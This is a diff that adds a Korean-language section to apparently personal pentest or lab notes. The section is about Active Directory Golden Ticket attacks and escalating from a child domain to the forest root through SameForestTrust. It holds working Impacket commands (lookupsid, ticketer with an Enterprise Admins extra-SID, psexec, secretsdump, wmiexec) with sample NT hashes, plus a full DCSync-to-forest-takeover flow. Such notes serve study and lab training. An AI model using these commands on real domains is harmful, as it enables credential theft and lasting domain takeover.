@@ -1373,3 +1373,168 @@ ntlmrelayx.py -tf smb_targets.txt -smb2support --lsa
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>SameForestTrust</strong></summary>
+
+## KRBTGT가 중요한 이유
+
+### Kerberos 인증 구조
+
+```
+사용자 로그인 요청
+      ↓
+[KDC - Key Distribution Center]  ← krbtgt가 여기서 동작
+      ↓
+TGT 발급 (krbtgt 해시로 서명)
+      ↓
+TGT로 서비스 티켓 요청
+      ↓
+도메인 리소스 접근
+```
+
+- 도메인 내 **모든 Kerberos 티켓은 krbtgt 해시로 서명**
+- DC는 티켓 검증 시 krbtgt 해시로 복호화하여 신뢰 여부 판단
+- **krbtgt = 티켓의 진위를 보증하는 도장**
+
+### Golden Ticket이란?
+
+krbtgt 해시를 알면 **TGT를 직접 위조** 가능
+
+```
+DC 입장에서:
+정상 TGT  →  krbtgt 해시로 서명됨  →  신뢰 ✅
+위조 TGT  →  krbtgt 해시로 서명됨  →  신뢰 ✅  ← 구분 불가!
+```
+
+| 항목 | 내용 |
+|------|------|
+| 위조 대상 | 존재하지 않는 계정도 가능 |
+| 권한 설정 | Domain Admin 등 임의 설정 |
+| 유효 기간 | **최대 10년으로 설정 가능** |
+| DC 온라인 여부 | **불필요** (오프라인 생성 가능) |
+
+---
+
+## Administrator 해시 vs krbtgt 해시 비교
+
+| 항목 | Administrator NT Hash | krbtgt Golden Ticket |
+|------|----------------------|---------------------|
+| 도메인 관리자 권한 | ✅ | ✅ |
+| sub 도메인 장악 | ✅ | ✅ |
+| **비밀번호 변경 시** | **즉시 무효화** ❌ | **2회 변경 전까지 유효** ✅ |
+| DC 온라인 필요 | 필요 | 불필요 |
+| 티켓 유효기간 | Kerberos 정책 따름 | 최대 10년 |
+| 탐지 난이도 | 상대적으로 쉬움 | 어려움 |
+| 루트 도메인 확장 | ❌ | ✅ (SID 추가 시) |
+
+> **Administrator 해시** = "지금 당장 들어가는 열쇠"
+> **krbtgt 해시** = "열쇠 공장을 통째로 가진 것"
+
+### 실제 공격자 관점에서의 활용
+
+```
+Administrator 해시  →  즉각적인 접근에 사용 (sub 도메인 장악)
+krbtgt 해시        →  장기적인 백도어 + 루트 도메인 확장
+```
+
+---
+
+## SameForestTrust를 통한 루트 도메인 확장
+
+### SameForestTrust란?
+
+```
+SUB.POSEIDON.YZX  →  POSEIDON.YZX
+     하위 도메인         루트 도메인
+     (같은 포레스트 내)
+```
+
+### Trust 종류별 위험도
+
+| Trust 종류 | SID 필터링 | 위험도 |
+|-----------|-----------|--------|
+| **SameForestTrust** | **❌ 없음** | **최고** |
+| ExternalTrust | ✅ 있음 | 중간 |
+| ForestTrust | ✅ 있음 | 중간 |
+
+같은 포레스트 내부는 기본적으로 완전히 신뢰하기 때문에 **SID 필터링이 작동하지 않음**
+
+### 루트 도메인 침투 흐름
+
+```
+DCSync로 krbtgt 해시 탈취
+        ↓
+Golden Ticket 생성 시 Enterprise Admins SID 추가
+        ↓
+SameForestTrust 경유
+        ↓
+poseidon.yzx 루트 도메인 장악 ✅
+        ↓
+포레스트 전체 완전 장악
+```
+
+---
+
+## 리눅스(Impacket)로 Golden Ticket 생성
+
+### Step 1. 도메인 SID 확인
+
+```bash
+lookupsid.py sub.poseidon.yzx/Administrator@DC02.sub.poseidon.yzx \
+  -hashes :3bcdd818f7ec942ac91aa30d8db71927
+```
+
+### Step 2. Golden Ticket 생성 (ticketer.py)
+
+```bash
+python3 ticketer.py \
+  -nthash 80f23a248d39b8cb93df3a4a2f4199a1 \
+  -domain-sid [SUB 도메인 SID] \
+  -domain sub.poseidon.yzx \
+  -extra-sid [루트도메인 Enterprise Admins SID]-519 \
+  Administrator
+```
+
+> `/extra-sid`에 Enterprise Admins SID를 포함하면 별도 명령어 없이 한 번에 생성 가능
+> `krbtgt` hash 사용
+
+### Step 3. 티켓 등록 및 사용
+
+```bash
+# 환경변수에 티켓 등록
+export KRB5CCNAME=Administrator.ccache
+
+# 루트 도메인 접근
+psexec.py -k -no-pass poseidon.yzx/Administrator@DC.poseidon.yzx
+secretsdump.py -k -no-pass poseidon.yzx/Administrator@DC.poseidon.yzx
+wmiexec.py -k -no-pass poseidon.yzx/Administrator@DC.poseidon.yzx
+```
+
+---
+
+## 전체 공격 흐름 요약
+
+```
+LISA 계정 GetChangesAll 권한 확인 (BloodHound)
+        ↓
+DCSync 공격으로 모든 해시 덤프
+        ↓
+┌─────────────────────────────────────┐
+│  Administrator 해시 획득             │
+│  → sub.poseidon.yzx 즉시 장악 ✅    │
+│  → DC의 Administrator = 도메인 관리자│
+└─────────────────────────────────────┘
+        ↓
+┌─────────────────────────────────────┐
+│  krbtgt 해시 획득                    │
+│  → Golden Ticket 생성               │
+│  → 장기 지속성 확보 ✅               │
+│  → SameForestTrust 경유             │
+│  → poseidon.yzx 루트 도메인 장악 ✅  │
+└─────────────────────────────────────┘
+```
+
+  
+</details>
